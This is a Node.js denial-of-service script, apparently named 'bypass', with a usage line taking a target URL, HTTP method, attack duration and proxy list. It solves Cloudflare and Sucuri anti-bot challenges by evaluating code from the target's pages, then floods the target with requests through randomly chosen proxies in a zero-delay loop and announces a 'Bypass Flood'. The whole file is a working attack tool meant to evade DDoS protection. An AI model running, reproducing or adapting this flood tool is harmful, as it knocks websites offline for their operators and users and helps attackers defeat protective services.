//Usage : node bypass <Target/url> <GET/POST/HEAD> <Attack time> <Porxy list>
process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
const url = require('url');
var fs = require('fs');
var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');

var request      = requestModule.defaults({jar: jar});
var UserAgent    = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
];
var Timeout      = 6000; 
var cloudscraper = {};
var MaxChallengesToSolve = 10;

var blacklist = [
    "pearlovka.space"
    ];

cloudscraper.get = function(url, callback, headers) {
  performRequest({
    method: 'GET',
    url: url,
    headers: headers
  }, callback);
};

cloudscraper.post = function(url, body, callback, headers) {
  var data = '';
  var bodyType = Object.prototype.toString.call(body);

  if(bodyType === '[object String]') {
    data = body;
  } else if (bodyType === '[object Object]') {
    data = Object.keys(body).map(function(key) {
      return key + '=' + body[key];
    }).join('&');
  }

  headers = headers || {};
  headers['Content-Type'] = headers['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
  headers['Content-Length'] = headers['Content-Length'] || data.length;

  performRequest({
    method: 'POST',
    body: data,
    url: url,
    headers: headers
  }, callback);
}

cloudscraper.request = function(options, callback) {
  performRequest(options, callback);
}

function performRequest(options, callback) {
  options = options || {};
  options.headers = options.headers || {};

    options.headers['accept'] = options.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
    options.headers['accept-encoding'] = options.headers['accept-encoding'] || 'gzip, deflate, br';
    options.headers['accept-language'] = options.headers['accept-language'] || 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6';
    options.headers['cache-control'] = options.headers['cache-control'] || 'no-cache';
    options.headers['pragma'] = options.headers['pragma'] || 'no-cache';
    options.headers['upgrade-insecure-requests'] = options.headers['upgrade-insecure-requests'] || '1';

  makeRequest = requestMethod(options.method);

  if('encoding' in options) {
    options.realEncoding = options.encoding;
  } else {
    options.realEncoding = 'utf8';
  }
  options.encoding = null;

  if (!options.url || !callback) {
    throw new Error('To perform request, define both url and callback');
  }

  options.headers['user-agent'] = options.headers['user-agent'] || UserAgent[Math.floor(Math.random() * UserAgent.length)];
  options.challengesToSolve = options.challengesToSolve || MaxChallengesToSolve;
  options.followAllRedirects = options.followAllRedirects === undefined ? true : options.followAllRedirects;

  makeRequest(options, function(error, response, body) {
    processRequestResponse(options, {error: error, response: response, body: body}, callback);
  });
}

function processRequestResponse(options, requestResult, callback) {
  var error = requestResult.error;
  var response = requestResult.response;
  var body = requestResult.body;
  var validationError;
  var stringBody;
  var isChallengePresent;
  var isRedirectChallengePresent;
  var isTargetPage;

  if (error || !body || !body.toString) {
    return callback({ errorType: 0, error: error }, response, body);
  }

  stringBody = body.toString('utf8');

  if (validationError = checkForErrors(error, stringBody)) {
    return callback(validationError, response, body);
  }

  isChallengePresent = stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1;
  isRedirectChallengePresent = stringBody.indexOf('You are being redirected') !== -1 || stringBody.indexOf('sucuri_cloudproxy_js') !== -1;
  isTargetPage = !isChallengePresent && !isRedirectChallengePresent;

  if(isChallengePresent && options.challengesToSolve == 0) {
    return callback({ errorType: 4 }, response, body);
  }

  if (isChallengePresent) {
    setTimeout(function() {
      solveChallenge(response, stringBody, options, callback);
    }, Timeout);
  } else if (isRedirectChallengePresent) {
    setCookieAndReload(response, stringBody, options, callback);
  } else {
    processResponseBody(options, error, response, body, callback);
  }
}

function checkForErrors(error, body) {
  var match;

  if(error) {
    return { errorType: 0, error: error };
  }

  if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
    return { errorType: 1 };
  }

  match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

  if (match) {
    return { errorType: 2, error: parseInt(match[1]) };
  }

  return false;
}

function solveChallenge(response, body, options, callback) {
  var challenge = body.match(/name="jschl_vc" value="(\w+)"/);
  var host = response.request.host;
  var makeRequest = requestMethod(options.method);
  var jsChlVc;
  var answerResponse;
  var answerUrl;

  if (!challenge) {
    return callback({errorType: 3, error: 'I cant extract challengeId (jschl_vc) from page'}, response, body);
  }

  jsChlVc = challenge[1];

  challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);

  if (!challenge) {
    return callback({errorType: 3, error: 'I cant extract method from setTimeOut wrapper'}, response, body);
  }

  challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];

  challenge = challenge[1];

  challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');

  challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
  challenge = challenge.replace(/'; \d+'/g, '');

  try {
    answerResponse = {
      'jschl_vc': jsChlVc,
      'jschl_answer': (eval(challenge) + response.request.host.length),
      'pass': challenge_pass
    };
  } catch (err) {
    return callback({errorType: 3, error: 'Error occurred during evaluation: ' +  err.message}, response, body);
  }

  answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl';

  options.headers['Referer'] = response.request.uri.href; // Original url should be placed as referer
  options.url = answerUrl;
  options.qs = answerResponse;
  options.challengesToSolve = options.challengesToSolve - 1;

  makeRequest(options, function(error, response, body) {
    processRequestResponse(options, {error: error, response: response, body: body}, callback);
  });
}

function setCookieAndReload(response, body, options, callback) {
  var challenge = body.match(/S='([^']+)'/);
  var makeRequest = requestMethod(options.method);

  if (!challenge) {
    return callback({errorType: 3, error: 'I cant extract cookie generation code from page'}, response, body);
  }

  var base64EncodedCode = challenge[1];
  var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');

  var sandbox = {
    location: {
      reload: function() {}
    },
    document: {}
  };

  vm.runInNewContext(cookieSettingCode, sandbox);

  try {
    jar.setCookie(sandbox.document.cookie, response.request.uri.href, {ignoreError: true});
  } catch (err) {
    return callback({errorType: 3, error: 'Error occurred during evaluation: ' +  err.message}, response, body);
  }

  options.challengesToSolve = options.challengesToSolve - 1;

  makeRequest(options, function(error, response, body) {
    processRequestResponse(options, {error: error, response: response, body: body}, callback);
  });
}

function requestMethod(method) {
  method = method.toUpperCase();

  return method === 'POST' ? request.post : request.get;
}

function processResponseBody(options, error, response, body, callback) {
  if(typeof options.realEncoding === 'string') {
    body = body.toString(options.realEncoding);
    if (validationError = checkForErrors(error, body)) {
      return callback(validationError, response, body);
    }
  }


  callback(error, response, body);
}

function start(method, url, proxy) {
    performRequest({
    method: method,
    url: url,
    proxy: 'http://' + proxy,
    json: false
    }, (error, response, body) => {});
}

setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);

var block = url.parse(process.argv[2]).host.replace("www.", '').toLowerCase();

setInterval(() => {
    start(process.argv[3], process.argv[2], proxies[Math.floor(Math.random() * proxies.length)]);
}, 0);

console.log("%s Bypass Flood has been sent to %s for %s seconds ", process.argv[3], process.argv[2], process.argv[4]);
